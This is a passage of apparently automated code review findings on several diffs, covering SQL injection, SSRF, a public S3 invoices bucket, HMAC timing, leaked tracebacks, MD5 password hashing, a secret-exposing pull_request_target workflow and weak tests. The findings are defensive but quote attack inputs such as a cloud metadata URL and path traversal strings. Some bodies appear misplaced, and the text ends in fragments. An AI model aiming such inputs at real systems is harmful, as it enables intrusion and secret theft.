    return execute(sql, (f"%{term}%", status))
```

The `execute` docstring in `billing/db.py` already states that `params` must carry every caller value, so this call also violates the helper's contract.

findings.title: search_customers interpolates values instead of using execute() params
findings.body:
`billing/db.execute(sql, params=None)` documents that `params` "must carry every caller value", and `get_customer` on line 5 follows that. `search_customers` instead embeds `term` and `status` directly into the SQL text and calls `execute(sql)` with no params, breaking that contract.

Beyond the obvious injection exposure, this is wrong for ordinary inputs: a customer search for `O'Brien` produces `... LIKE '%O'Brien%' ...`, which is a syntax error, and a `term` containing `%` or `_` silently changes the LIKE pattern semantics. Rewrite as `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))`, escaping LIKE metacharacters in `term` if literal matching is intended.

findings.title: search_customers has no test coverage at all
findings.body: The new function search_customers builds a query via f-string interpolation and is not exercised by any test in this diff. Nothing would catch a regression, a broken query, or the injection vulnerability itself if it were fixed incorrectly later. At minimum a test asserting that user-supplied values are passed as parameters (not interpolated into the SQL string) would catch this class of defect.

findings.title: Public function `search_customers` has no docstring
findings.body: The function `search_customers` is a new public API (exported from the queries module) that accepts parameters `term` and `status` and returns database results. A caller cannot determine the expected types, constraints, or return format from the function signature alone. Add a docstring documenting the parameters and return value.

findings.title: SSRF: verify_endpoint fetches caller URL with no host/scheme check
findings.body:
`verify_endpoint(url)` passes its argument straight into `requests.get` with no validation. The function immediately above it parses the host and rejects anything not in `ALLOWED_HOSTS` before calling `requests.post`, so the allowlist control exists in this module and is simply not applied on the new path.

If `url` originates from the webhook-registration request (as the PR title implies), a caller can point it at `http://169.254.169.254/latest/meta-data/...`, `http://127.0.0.1:<port>/...`, or internal-only hostnames, and learn from the returned status code whether the target exists — a working internal port/host scanner, and a request forgery against anything that acts on a bare GET. `file://` and other schemes are also reachable since no scheme check is performed, and `requests` follows redirects by default, so even an allowlisted host could bounce the request to a private address.

Fix: route this through the same validation used at lines 8-9 — resolve and check the scheme (http/https only) and the host against `ALLOWED_HOSTS`, and disable redirect following (`allow_redirects=False`) or re-validate each hop.

_Also raised by the correctness agent:_ verify_endpoint skips the ALLOWED_HOSTS check the module enforces

findings.title: No test coverage for new verify_endpoint function
findings.body: verify_endpoint is a new public function that performs an outbound HTTP GET and returns a status code, but no test file is included in this diff. Unlike the sibling function above it, which validates the host against ALLOWED_HOSTS before making a request, verify_endpoint has no such check and no test would catch a regression (e.g. if an allowlist check were later added incorrectly, or removed). Since nothing exercises this function, a broken or insecure implementation would ship undetected.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: The declared contract of this function is "return the status code of the endpoint", but the failure modes a verification call most expects — DNS failure, refused connection, TLS error, the 5s timeout firing — all surface as `requests.exceptions.RequestException` rather than a return value. Any caller written against the `-> int` shape will crash on the most common input (a mistyped or unreachable customer URL). Wrap the call and return a sentinel (or `None`) for transport failures, or document that callers must handle `RequestException`.

findings.title: Customer invoices bucket disables all S3 public access protections
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for the bucket `acme-customer-invoices`. This is the same configuration used for the deliberately-public `assets` bucket, but it is applied to a bucket that by name holds customer billing records.

With all four flags false, any principal that can call `PutBucketPolicy` or `PutObjectAcl` (including a compromised CI role, an over-broad IAM policy, or a future PR) can make the bucket or individual invoice objects world-readable with no account-level guardrail to stop it, and the S3 account-level block cannot save it either. Bucket names are a global namespace, so `acme-customer-invoices` is trivially guessable by an outside attacker probing for it.

Unless this bucket is intended to be public, drop the `aws_s3_bucket_public_access_block.invoices` resource's overrides and set all four values to `true` (or omit the resource and rely on the AWS default of blocked, which is safer to read). While here, consider adding `aws_s3_bucket_server_side_encryption_configuration` and `aws_s3_bucket_versioning` for this bucket.

_Also raised by the correctness agent:_ Invoices bucket disables all S3 public access protections

_Also raised by the tests agent:_ Invoices bucket public-access block disables all protections with no validation

findings.title: Public access block configuration contradicts private intent
findings.body: The invoices bucket is configured with all public access blocks set to false (lines 19-22), making it publicly accessible. However, the PR description explicitly states 'the next is not meant to be' public. This configuration does not match the stated intent and will mislead future maintainers about what this resource is supposed to do. The resource should have all block_public_* settings set to true if invoices are meant to be private, or the PR description should be updated if public access is intentional.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` is a line-for-line copy of `verify_stripe` except that the final comparison uses `==` rather than `hmac.compare_digest`. `==` on str short-circuits on the first differing byte, so the time taken to return False leaks how many leading hex characters of the expected digest the attacker guessed correctly; that is enough to recover a valid signature byte-by-byte and forge webhook payloads. Change line 12 to `return hmac.compare_digest(expected, header)` to match line 7.

Secondary, same line: the two functions also now behave differently on a missing header. `compare_digest` raises `TypeError` when `header` is `None`, while `==` quietly returns `False`. If the caller relies on the stripe function's exception to distinguish "no signature sent" from "bad signature", that distinction is lost for acmepay. Switching to `compare_digest` resolves this too.

_Also raised by the security agent:_ Webhook HMAC compared with `==` instead of compare_digest

findings.title: Exception message and traceback returned in HTTP 500 response
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` and `traceback.format_exc()` into the response. Any unauthenticated caller who can provoke an unhandled exception (malformed input, a missing record, a DB timeout) receives absolute file paths, module and function names, source line fragments, framework and library versions, and whatever the exception message happens to embed — which for DB drivers routinely includes the failing SQL and connection/DSN details. That is a direct reconnaissance aid for finding further vulnerabilities and, in the DSN/SQL case, can itself disclose credentials or schema.

Keep the opaque body for clients and keep the detail server-side, where `log.exception("request failed")` on line 8 already records it. If a debugging handle is needed, return a correlation id: e.g. generate a UUID, log it alongside the exception, and return `{"error": "internal error", "request_id": rid}`. If verbose output is genuinely wanted for local work, gate it on an explicit debug flag that is off by default rather than on unconditionally.

_Also raised by the correctness agent:_ traceback.format_exc() ignores the passed-in exc and may yield 'NoneType: None'

_Also raised by the correctness agent:_ Error response body changes from a stable constant to variable exception text

findings.title: No test guards the content of the error response body
findings.body: The handle() function's return value (the dict containing 'error' and 'traceback') is not exercised by any test in this diff. A change like this, which now exposes internal exception text and a full traceback to callers, could be silently reverted or further loosened without any test failing. Add a test asserting the exact shape/content of the response for a known exception, so behavior changes to this security-sensitive path are caught.

findings.title: Public error handler lacks contract documentation
findings.body: The `handle()` function is exported from `api/errors.py` and called by external error-handling machinery to format responses to clients. It now returns exception details and tracebacks to callers. Callers (and anyone reading this module) cannot know from the function signature alone that internal exception details are being exposed, what those fields contain, or whether this is intentional. Add a docstring documenting the return contract and the security implications of exposing exception text.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body: `hash_reset_password` stores a user-supplied password as a bare `hashlib.md5(...).hexdigest()`. MD5 is a fast, unsalted, GPU-friendly digest: an attacker who obtains the stored value (DB dump, backup, log) can recover the plaintext by rainbow table or brute force in seconds, and identical passwords across accounts produce identical digests. The same module already does this correctly on line 7 with `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`. Delete `hash_reset_password` and call `hash_password` on the reset path; if the value is really a short-lived reset *token* rather than a password, generate it with `secrets.token_urlsafe`, store a SHA-256 of it, give it an expiry, and compare with `hmac.compare_digest` — and rename it so it is not mistaken for password storage.

findings.title: Reset path emits MD5 hash incompatible with bcrypt verifier
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char hex MD5 digest. If both write to the same stored-credential field, any password set through the reset path cannot be verified by a `bcrypt.checkpw`-based login check — `checkpw` raises/returns false on a non-bcrypt salt — so users would be locked out, or the login path has a second comparison branch that silently accepts unsalted MD5. Either way the two producers disagree on the format their consumer expects. The reset path should call `hash_password` (bcrypt) so there is exactly one stored format.

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password is new, security-sensitive code (used for password reset) with no accompanying test in this diff. If it were changed to something even weaker, or broken entirely, nothing would catch it. Add a test asserting the actual hex digest output for a known input, distinct from mock-based assertions.

findings.title: Public function `hash_reset_password` lacks contract documentation
findings.body: The function name `hash_reset_password` does not clearly convey that it uses MD5 (a weak cryptographic hash unsuitable for password storage) versus bcrypt (suitable for password storage). A caller might reasonably confuse this with `hash_password` or misunderstand its intended use. A docstring should clarify: (1) this is for password reset tokens, not password storage, and (2) the security model it assumes (e.g., that the reset token is ephemeral and not the password itself).

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
Switching the trigger from `pull_request` to `pull_request_target` (line 4) makes the job run in the context of the base repository: it has access to `secrets.*` and a `GITHUB_TOKEN` with the repository's default (typically write) permissions, and it runs without the manual-approval gate that applies to first-time contributors on `pull_request`.

Lines 11-12 then explicitly check out `github.event.pull_request.head.sha` — the untrusted fork commit — and line 13 executes `./scripts/measure.sh` from that checkout, with `secrets.NPM_TOKEN` injected into its environment on lines 14-15. A fork author only has to open a PR that edits `scripts/measure.sh` (or anything it sources, or a `package.json` lifecycle script it triggers) to run arbitrary commands that can exfiltrate `NPM_TOKEN` and any other secret reachable from that runner, and use the privileged `GITHUB_TOKEN` against the base repo.

Recommended fix: split this into two workflows. Keep the untrusted build/measure step on `pull_request` (no secrets, read-only token). If a privileged step is genuinely needed, run it on `pull_request_target` without ever checking out or executing fork code — consume only the data you need via the event payload or a `workflow_run` artifact. If this job must stay as is, at minimum do not check out the fork ref, drop `NPM_TOKEN`, and add an explicit `permissions: contents: read`.

_Also raised by the correctness agent:_ pull_request_target executes fork-controlled code with repo secrets

findings.title: Key now requires JSON-serialisable context; previously any hashable value worked
findings.body:
The old key was `(template_source, tuple(sorted(context.items())))`, which accepted any hashable value — `datetime`, `Decimal`, `UUID`, enums, custom objects with `__hash__`. The new key runs `json.dumps([template_source, context])`, which raises `TypeError: Object of type X is not JSON serializable` for exactly those values. Any existing caller passing a non-JSON type in `context` goes from a working render to an uncaught exception, and the failure happens in the cache layer before `_render` is ever consulted.

If the digest form is wanted, serialise with a `default=` fallback (e.g. `default=repr`) or fall back to the old tuple key when `json.dumps` fails, and add a test covering a non-JSON context value.

findings.title: No test covers context values that aren't JSON-serializable
findings.body: The key derivation changed from `tuple(sorted(context.items()))` to `json.dumps([template_source, context], sort_keys=True)`. The old approach only required context values to be hashable/sortable; the new approach requires them to be JSON-serializable. Any caller passing a context with a non-JSON-serializable value (e.g. a datetime, a custom object, a set) will now raise a `TypeError` inside `cached_render` instead of working as before. None of the new tests exercise this behavior change, so a regression here would pass CI silently.

findings.title: `spy` fixture is not defined by this PR; test may error or really run tar
findings.body:
`test_runs_without_a_shell` requests a `spy` fixture and then asserts on `spy.last_call.kwargs["shell"]`. This PR adds no `conftest.py` and no plugin declaration, so either (a) pytest errors with `fixture 'spy' not found` and the test never runs, or (b) `spy` exists but does not patch `subprocess.run`, in which case `create_archive("nightly", "/srv/data")` shells out for real and tries to write `/exports/nightly.tar.gz` during the test run. Add the fixture (or a `monkeypatch.setattr(subprocess, "run", ...)`) in this PR so the test is self-contained and cannot touch the filesystem.

_Also raised by the tests agent:_ Test only asserts the shell kwarg, not the actual command argv

findings.title: Allowlist rejects previously valid archive names (dots, length > 64)
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]{1,64}`. The previous implementation interpolated `name` verbatim, so any caller passing a dotted or date-stamped name (`backup.2024-01-01`, `tenant.eu-west`), a name containing a space, or a name longer than 64 characters used to succeed and now raises `ValueError` at call time. That is a runtime break for existing callers, not a compile-time one, so it will surface in production rather than in CI. Either widen the character class to include `.` (which is harmless in an argv element — traversal needs `/`) and reconsider the 64-char ceiling, or grep the callers and confirm none of them generate such names before merging. No caller code was retrieved for this review, so the narrowing could not be verified as safe.

findings.title: `directory` is unvalidated; may permit archiving arbitrary paths
findings.body:
`name` is now tightly allowlisted, but `directory` is passed straight through to tar as a file operand with no validation or containment check. Shell injection is genuinely closed (list argv, `shell=False`, `--` before the operand), so this is not a command-execution issue. The remaining exposure is scope: if a caller can influence `directory`, they can have tar read any path the process can read (`/etc`, `/root`, mounted secrets) and write it into `/exports/<name>.tar.gz`, which is presumably a location whose contents are retrievable. tar will also follow the directory tree as given, so a traversing value like `../../etc` or an absolute `/` is accepted.

If `directory` only ever comes from trusted server-side configuration, this is nothing. If it can come from a request, resolve it and assert it stays under an expected root before invoking tar, the same way `name` is now constrained.

findings.title: No test exercises the actual argv built for a valid name
findings.body: There is no test verifying that a valid, allowlisted name produces the expected argv (`["tar", "-czf", "/exports/<name>.tar.gz", "--", directory]`). Both existing tests only check the rejection path and the `shell` flag; the construction of the tar command itself — the core of this refactor — is unverified end-to-end.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() but never checks its return value or any resulting state, so it cannot fail regardless of what render() produces for an empty invoice. Add an assertion on the expected output.

_Also raised by the correctness agent:_ test_renders_empty_invoice contains no assertion

findings.title: Test asserts mock call_count, not rendered output
findings.body:
test_renders_line_items patches format_line and only checks that it was called twice. It never verifies what render() actually produces, so a bug that mis-formats or drops line items (e.g. wrong output string, wrong ordering) would not be caught. Replace with an assertion on the returned/rendered value.

_Also raised by the correctness agent:_ test_renders_line_items asserts on a mock, not rendered output

findings.title: Deleted the only test covering the fixed rounding behavior
findings.body:
The PR description states this is a fix for a rounding bug, but the test `test_rounds_half_to_even` that exercised the half-to-even rounding case (Decimal("2.345") -> Decimal("2.34")) was deleted in this same commit rather than updated to match the corrected behavior. With this test gone, nothing in the suite verifies round_cents' handling of exact-half values, so a future regression in that logic would go undetected.

_Also raised by the correctness agent:_ Deleting the half-to-even test removes the only exact-.5 boundary check

findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` into the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds only the attribute on the `notify.transport` module; `send_with_retry` continues to call the original function object it captured. The test therefore invokes the real `deliver` three times — it either hits real transport/network, or passes only coincidentally because the real call happens to return a falsy value, and it will not catch a regression in the retry loop.

Use the same target as the sibling test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count (`assert mock.call_count == 3`) so the test actually pins the retry behaviour it is named after.

_Also raised by the tests agent:_ Mock patches wrong target; real deliver() runs, not the mock

findings.title: csv_rows never escapes values, producing malformed CSV
findings.body: `csv_rows` joins `str(r.get(c, ""))` with commas directly. A value containing a comma or a double quote will break the column alignment of the emitted line — exactly the case that `csv_escape`, added ten lines below in the same change, exists to handle, yet nothing calls it. Route each field through `csv_escape` (and make `csv_escape` tolerate non-str input, since `"," in value` raises `TypeError` for ints/None, or apply `str()` before the call). Consider the same for `csv_header` if column names can contain separators.

findings.title: csv_rows joins values without calling csv_escape
findings.body:
`csv_rows` interpolates each cell directly into a comma-joined line and never calls the `csv_escape` helper added immediately below it. A field value that contains a comma splits into extra columns, and a value containing `\r` or `\n` splits into extra records — so whoever supplies the row data controls the structure of the emitted CSV, not just its content. Downstream consumers (spreadsheet import, an ETL loader) then see fabricated columns/rows.

Two fixes, both cheap:
- have `csv_rows` route every cell through `csv_escape`, i.e. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`;
- widen `csv_escape`'s trigger condition to include `\n` and `\r` (quoting already handles embedded newlines correctly per RFC 4180, but the current guard only fires on `,` and `"`, so newline-bearing values are emitted raw).

Preferably use `csv.writer`, which gets all of this right. Note also that neither function neutralises leading `=`, `+`, `-` or `@`, so values are still live formulas on spreadsheet open — worth deciding explicitly whether this exporter's output is ever opened in a spreadsheet.

I cannot see the caller of `csv_rows` in this diff or in the retrieved context, so I cannot confirm the row data is externally supplied; confidence is lowered to reflect that.

findings.title: New exporter functions added with no accompanying tests
findings.body: None of the six new functions (csv_rows, csv_escape in reports/csv_export.py; dump_streaming, dump_pretty in reports/json_export.py; margins_for, usable_width in reports/pdf_export.py) have tests, even though the repository already tests the pre-existing sibling function in each of these files (test_csv_header_matches_columns). A regression in CSV escaping logic, JSON chunking, or margin/width arithmetic would currently go undetected. Add unit tests for each function following the existing test_csv.py pattern (e.g. assert csv_escape('a,b') == '"a,b"', assert list(dump_streaming([...], 2)) == [...], assert margins_for('a4') == (42, 29, 42, 29)).

findings.title: Date equality assertion fails when the test runs across midnight UTC
findings.body:
`issue_token()` samples the clock inside the call, and `datetime.now(timezone.utc)` on line 11 samples it again afterwards. If the first read lands at 23:59:59.999 UTC and the second at 00:00:00.000, `.date()` differs and the assertion fails, despite nothing being wrong with the code under test. This is a time-dependent flake that will fire roughly once per deploy-cadence at the boundary and be unreproducible afterwards.

Fix by injecting the clock (e.g. `issue_token(now=fixed)`) or freezing time, or by bracketing: capture `before = datetime.now(timezone.utc)` prior to `issue_token()` and assert `before <= token.issued_at <= datetime.now(timezone.utc)` rather than comparing calendar dates.

_Also raised by the tests agent:_ Time-dependent test flakes at UTC midnight

findings.title: `is_expired` called without `now`, relying on an unverified default
findings.body: The existing test on line 6 always passes `now=` explicitly; this new call omits it. If `now` is a required parameter the test raises `TypeError` rather than testing anything. Even if a default exists, omitting it reintroduces a wall-clock dependency in the same test that is already time-sensitive. Passing an explicit `now` keeps the assertion deterministic and matches the surrounding style.

If the expiry check were removed, inverted, or the exception type/message changed, no test would fail. Add a test that passes an already-expired coupon and asserts CouponExpired is raised.

findings.title: expires_at may be None or naive, making the comparison raise TypeError
findings.body:
Line 9 compares `coupon.expires_at` directly against a timezone-aware `datetime`. Two reachable inputs break this:

- A coupon with no expiry (`expires_at is None`) raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'` instead of applying cleanly.
- A coupon whose `expires_at` is a naive datetime (e.g. loaded from a DB column without tzinfo) raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

Both surface as an opaque `TypeError` from the billing path rather than a handled outcome. Guard explicitly, e.g. `if coupon.expires_at is not None and _as_utc(coupon.expires_at) < datetime.now(timezone.utc):`, and decide deliberately whether a missing expiry means "never expires".

findings.title: Blocking requests.get inside async def stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def`, so it runs on the event loop thread, but `requests.get` is a synchronous socket call. While it is in flight nothing else on the loop can make progress \u2014 every other in-flight request, timer and heartbeat is frozen for as long as the call takes, up to the full `timeout=5`. Under load this serialises the whole service behind billing.internal's latency.

The module already imports and uses `httpx` for exactly this shape of call. Use the async client instead, e.g. accept an `httpx.AsyncClient` like `fetch_plan` does and `await client.get(...)`, or `await httpx.AsyncClient().get(...)` with a managed lifetime. If the sync library is unavoidable, push it off the loop with `await asyncio.to_thread(requests.get, ...)`.

Note also that as written the coroutine contains no `await` at all, so it gains none of the concurrency the `async` keyword implies \u2014 callers pay the await-machinery cost for a fully blocking operation.

findings.title: No test would catch the blocking call inside fetch_plan_limits
findings.body: fetch_plan_limits is declared async but calls requests.get synchronously, which blocks the event loop. There is no test in this diff exercising this function's async behavior (e.g. asserting it doesn't block concurrent tasks, or mocking the HTTP call and awaiting the coroutine). If this function were reverted to a correct async implementation (using an AsyncClient), nothing would fail, and if the blocking bug were reintroduced later, nothing would catch it either.

findings.title: Unencoded tenant_id interpolated into internal billing service URL
findings.body:
`tenant_id` is interpolated straight into the request path with an f-string and no validation or percent-encoding before being handed to `requests.get`. If `tenant_id` is attacker-influenced (e.g. taken from a request path, header, or JWT claim), a value containing `../`, `?`, or `#` lets the caller steer the request to a different endpoint on `billing.internal` — an internal host that is presumably reachable only from this service and may not authenticate callers. `urllib3` resolves dot-segments, so `tenant_id="../../admin/keys"` yields `https://billing.internal/admin/keys`; `tenant_id="1?admin=true"` injects a query string.

Fix: validate `tenant_id` against the expected shape (e.g. UUID / digits) before use, or at minimum `urllib.parse.quote(str(tenant_id), safe="")`. The same treatment should be applied to the existing `fetch_plan` path for consistency.

findings.title: Async function with undocumented blocking I/O
findings.body: The function `fetch_plan_limits` is declared as `async` but lacks documentation about its blocking behavior. The synchronous `requests.get()` call on line 11 will block the event loop, contradicting the async contract that callers would expect. A caller seeing `async def` would reasonably assume they can safely await this without blocking other tasks, which is not true here. Either add a docstring explaining the blocking call, or refactor to use an async HTTP client like the `fetch_plan` function above.

findings.title: Bare except swallows KeyboardInterrupt/SystemExit and hides all failures
Public function behavior change not documented

Add a docstring documenting that this function returns None if the send operation fails, so callers are not surprised by the change from the previous direct exception propagation.
